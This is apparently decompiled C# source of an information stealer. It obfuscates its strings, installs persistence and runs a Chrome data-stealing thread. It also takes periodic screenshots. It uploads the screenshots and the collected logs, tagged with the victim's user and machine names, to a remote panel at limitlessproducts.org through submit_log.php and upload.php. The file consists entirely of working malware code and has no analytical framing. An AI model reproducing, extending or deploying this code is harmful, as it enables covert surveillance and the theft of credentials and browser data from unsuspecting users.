using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using My;

public class LOIFDUM
{
	public static string TXHGCMMI;

	public static string BHOVDBMX;

	public static string TVUNKUQG;

	public static string FFInfo;

	public static string YJQUQGLK;

	public static string SVYNYLTX;

	public static string UTMEJYQM;

	public static string CVCKFDPY;

	public static string CCKRUOEJ;

	public static string KYNPUTHC;

	public static string LCDMTOCK;

	public static string WUMUJW;

	public static string OPFURQDG;

	public static string XGRMBX;

	public static string FFStuff;

	public static string MHGSSER = "";

	public static string TGPMNJJI = EHMIWRQ.VIJVUUV("USEREMAIL", "False");

	public static string UQCRWYQO = EHMIWRQ.VIJVUUV("USERPASS", "False");

	public static string LVJDQQTL = EHMIWRQ.VIJVUUV("USERSMTP", "False");

	public static int CLTONVNV = 587;

	public static string JEDSEGDL = EHMIWRQ.VIJVUUV("DLEXSite", "False");

	public static string JQVOYYOL = EHMIWRQ.VIJVUUV("USERSITE", "False");

	public static string PPGVJOBE = EHMIWRQ.VIJVUUV("USERTYPE", "False");

	public static string ULTMCGBH = EHMIWRQ.VIJVUUV("USERTITLE", "False");

	public static string JNUCRRGM = EHMIWRQ.VIJVUUV("USERBODY", "False");

	public static string TVWLHJTV = EHMIWRQ.VIJVUUV("USERSCREENSHOTS", "False");

	public static string FLIFQBTN = EHMIWRQ.VIJVUUV("dqzC0LQW", "False");

	public static int VXRXFHVY = 900000;

	public static string SCJGBDTR = "";

	public static string WEWRTGQP = "";

	public static int number = 0;

	public static XNNKMUW GPYTFPQ;

	public static Thread KROKMSR = new Thread(QUJHDUJ);

	public static Thread GCThread = new Thread(DAChrome.GTCHRME);

	public static Thread NBQWILW = new Thread(OHKWIGC);

	public static Thread STRTTHRD = new Thread(DAStartup.Startupdll.StartPers);

	[STAThread]
	public static void Main()
	{
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			STRTTHRD.IsBackground = true;
			STRTTHRD.Start();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			GPYTFPQ = new XNNKMUW(WEWRTGQP);
			XNNKMUW.PYEWXKY();
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		try
		{
			KROKMSR.IsBackground = true;
			KROKMSR.Start();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			GCThread.IsBackground = true;
			GCThread.Start();
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("k6SwpsWrgMHGEw==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("jZnAwcKgv8bExI2OuMG7przKuqKEjsbSfpWuFw==", "False"), overwrite: true);
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("goa8vKhosMCvmIu1wLyzjbSotKiJsMHBuZkh", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("iZW8vb6cu8LAwImKtL23orjGtq2Qq8LPuqG7Gw==", "False"), overwrite: true);
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			NBQWILW.IsBackground = true;
			NBQWILW.Start();
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void QUJHDUJ()
	{
		//IL_01e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01eb: Expected O, but got Unknown
		string text = "";
		int num = 0;
		bool flag = true;
		checked
		{
			while (true)
			{
				Thread.Sleep(VXRXFHVY);
				text = "";
				string text2 = "";
				Thread.Sleep(100);
				try
				{
					WebClient webClient = new WebClient();
					text2 = EHMIWRQ.VIJVUUV("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(EHMIWRQ.VIJVUUV("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + EHMIWRQ.VIJVUUV("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(500);
				try
				{
					if (Operators.CompareString(WEWRTGQP, "", false) != 0)
					{
						SCJGBDTR = WEWRTGQP + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							StringBuilder stringBuilder = new StringBuilder();
							stringBuilder.Append("content=" + SCJGBDTR);
							stringBuilder.Append("&user=Anthracite");
							stringBuilder.Append("&title=" + EHMIWRQ.VIJVUUV("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + EHMIWRQ.VIJVUUV("aQ0=", "False") + Environment.MachineName.ToString());
							if (!flag)
							{
								stringBuilder.Append("&path=http://www.limitlessproducts.org/Limitless/Login/screenshots/default.png");
							}
							else
							{
								try
								{
									Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
									Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
									Graphics val2 = Graphics.FromImage((Image)(object)val);
									val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
									Bitmap val3 = val;
									((Image)val3).Save(Path.GetTempPath() + "ss" + num + ".png");
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
								}
								string text3 = Post.UploadImage("http://www.limitlessproducts.org/Limitless/Login/upload.php", Path.GetTempPath() + "ss" + num + ".png");
								stringBuilder.Append("&path=http://www.limitlessproducts.org/Limitless/Login/screenshots/" + text3 + ".png");
								num++;
							}
							Conversions.ToString(Post.SendData(new Uri("http://www.limitlessproducts.org/Limitless/Login/submit_log.php"), Post.RequestMethods.Post, stringBuilder));
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				SCJGBDTR = "";
				WEWRTGQP = "";
				MHGSSER = "";
				number++;
			}
		}
	}

	public static void OHKWIGC()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("eoatrq+NrLOxsXp7pa6ok6m3pyw=", EHMIWRQ.VIJVUUV("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("eoatrq+NrLOxsXp7pa6ok6m3pyw=", EHMIWRQ.VIJVUUV("g7nP3cEJ", "False")));
		directoryInfo.GetFiles();
		try
		{
			Thread.Sleep(25000);
			string text = TXHGCMMI.ToString() + Environment.NewLine + Environment.NewLine + BHOVDBMX + Environment.NewLine + Environment.NewLine + TVUNKUQG + Environment.NewLine + Environment.NewLine + YJQUQGLK + Environment.NewLine + Environment.NewLine + SVYNYLTX + Environment.NewLine + Environment.NewLine + UTMEJYQM + Environment.NewLine + Environment.NewLine + CVCKFDPY + Environment.NewLine + Environment.NewLine + CCKRUOEJ + Environment.NewLine + Environment.NewLine + LCDMTOCK + Environment.NewLine + Environment.NewLine + WUMUJW + Environment.NewLine + Environment.NewLine + OPFURQDG + Environment.NewLine + Environment.NewLine + XGRMBX;
			if ((Operators.CompareString(text, "", false) != 0) | (Operators.CompareString(text, (string)null, false) != 0))
			{
				try
				{
					StringBuilder stringBuilder = new StringBuilder();
					stringBuilder.Append("content=" + text);
					stringBuilder.Append("&user=Anthracite");
					stringBuilder.Append("&title=" + EHMIWRQ.VIJVUUV("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + EHMIWRQ.VIJVUUV("aQ0=", EHMIWRQ.VIJVUUV("g7nP3cEJ", "False")) + Environment.MachineName.ToString());
					stringBuilder.Append("&path=http://www.limitlessproducts.org/Limitless/Login/screenshots/default.png");
					Conversions.ToString(Post.SendData(new Uri("http://www.limitlessproducts.org/Limitless/Login/submit_log.php"), Post.RequestMethods.Post, stringBuilder));
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return;
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
